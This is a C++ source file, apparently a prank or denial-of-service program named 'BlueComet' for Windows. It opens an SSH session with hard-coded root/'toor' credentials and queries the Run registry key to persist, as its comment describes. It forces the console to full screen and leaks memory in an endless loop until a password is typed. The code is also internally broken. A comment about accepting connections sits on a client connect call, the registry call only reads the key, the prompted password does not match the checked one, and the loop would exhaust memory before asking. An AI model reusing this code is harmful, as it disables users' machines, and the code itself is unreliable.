/*@@@  @@@   @@@@@@   @@@@@@@    @@@@@@    @@@@@@   */
/*@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  */
/*@@!  !@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  */
/*!@!  @!!  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  */
/*@!@@!@!   @!@!@!@!  @!@@!@!   @!@  !@!  @!@  !@!  */
/*!!@!!!    !!!@!!!!  !!@!!!    !@!  !!!  !@!  !!!  */
/*!!: :!!   !!:  !!!  !!:       !!:  !!!  !!:  !!!  */
/*:!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  !:!  */
/* ::  :::  ::   :::   ::       ::::: ::  ::::: ::  */
/* :   :::   :   : :   :         : :  :    : :  :   */


#include <iostream>
#include <string>	
#include <cstring>
#include <libssh/libssh.h>
#include <cstring>
#include <cstdlib>
#include <Windows.h>
#pragma comment(lib, "Advapi32.lib")


using namespace std;

int main()
{
	
	/*set up remote connection for all hosts*/
	
    const char* host = "0.0.0.0"; // allow connections from any network
    int port = 2345;

    ssh_session session = ssh_new();
    if (session == NULL) {
        cerr << "Error creating SSH session" << endl;
        return 1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, "root"); // replace with your admin username
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc"); 

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
        ssh_free(session);
        return 1;
    }

    rc = ssh_userauth_password(session, NULL, "toor"); // replace with your admin password
    if (rc != SSH_AUTH_SUCCESS) {
        cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return 1;
    }

/* Create registry to include BlueComet in startup on all local machines */
	
    char re[MAX_PATH];
    string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));

    LONG ln = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "BlueComet", RRF_RT_REG_SZ, 0, 0, 0);

    /* Password to stop memory crash is P@thf1nder */
    const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
    char input[11];
    bool stopProgram = false;
    int loopCount = 0;
	
	   /* Set console to full screen mode */
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    SetConsoleDisplayMode(hConsole, CONSOLE_FULLSCREEN_MODE, &csbi);

    while (!stopProgram) {
        for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
            char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
            memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
        }
	/*Pull Current Memory Status*/
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        GlobalMemoryStatusEx(&status);
        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed. " << status.ullTotalPhys / (1024 * 1024) << " MB of memory remaining." << endl;
        loopCount++;
	/*Enter Password: Pathf1nder to stop. Remove BlueComet from registry to remove program.*/
        cout << "Enter password P@thF1nder to stop the program: ";
        cin >> input;
        if (strcmp(input, password) == 0) {
            cout << "Password correct. Stopping program. Remove BlueComet from memory or this will happen again." << endl;
            stopProgram = true;
        }
    }
    return 0;
}
